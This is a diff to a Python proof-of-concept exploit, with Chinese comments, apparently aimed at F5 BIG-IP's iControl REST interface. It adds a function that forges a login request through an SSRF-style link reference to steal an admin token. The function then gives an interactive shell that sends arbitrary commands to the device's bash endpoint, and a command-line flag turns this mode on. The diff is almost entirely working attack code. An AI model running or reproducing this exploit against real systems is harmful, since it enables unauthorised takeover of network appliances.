@@ -33,6 +33,47 @@ def poc_1(target_url, command):
     except Exception as e:
         print('url 访问异常 {0}'.format(target_url))
 
+def ssrf_poc(target_url):
+    check_url = target_url + '/mgmt/shared/authn/login'
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    data = json.dumps({'bigipAuthCookie': '', 'username': 'admin', 'loginReference': {'link': '/shared/gossip'}, 'userReference': {'link': 'https://localhost/mgmt/shared/authz/users/admin'}})
+    try:
+        # 获取 token 值
+        r1 = requests.post(url=check_url, headers=headers, data=data, verify=False, timeout=20)
+        if r1.status_code == 200 and '/mgmt/shared/authz/tokens/' in r1.text:
+            default = json.loads(r1.text)
+            token_value = default['token']['token']
+            print('[+] Get Token : {0}'.format(token_value))
+            # 执行命令 ，同 poc_1()
+            command_url = target_url + '/mgmt/tm/util/bash'
+            headers['Content-Type'] = 'application/json'
+            headers['X-F5-Auth-Token'] = token_value
+            # command_value = 'id'
+            while True:
+                command_value = str(input('command: '))
+                if command_value == 'exit':
+                    break
+                else:
+                    data_command = {'command': "run",'utilCmdArgs':"-c '{0}'".format(command_value)}
+                    try:
+                        r2 = requests.post(url=command_url, headers=headers, json=data_command, verify=False, timeout=20)
+                        if r2.status_code == 200 and 'commandResult' in r2.text:
+                            default = json.loads(r2.text)
+                            display = default['commandResult']
+                            print('$ > {0}'.format(display))
+                        else:
+                            print('命令执行异常，请重试')
+                    except Exception as e:
+                        print('服务异常')
+        else:
+            print('[-] 获取 Token 异常')
+    except Exception as e:
+        print('[-] 获取 Token 异常')
+
+
 def save_file(target_url, t):
     output_name = 'Output_{0}.txt'.format(t)
     f = open(output_name, 'a')
@@ -53,15 +94,17 @@ def main():
     parser.add_argument('-u', '--url', type=str, help=' 目标URL ')
     parser.add_argument('-f', '--file', type=str, help=' 批量文件路径 ')
     parser.add_argument('-c', '--command', type=str, default="id", help=' 执行命令 ')
+    parser.add_argument('-s', '--ssrf', action='store_true', help=' 使用ssrf获取token执行命令 ')
     args = parser.parse_args()
 
     url = args.url
     file = args.file
     command = args.command
 
-
-
-    if not url is None:
+    if args.ssrf:
+        target_url = format_url(url)
+        ssrf_poc(target_url)
+    elif not url is None:
         target_url = format_url(url)
         poc_1(target_url, command)
     elif file != '':
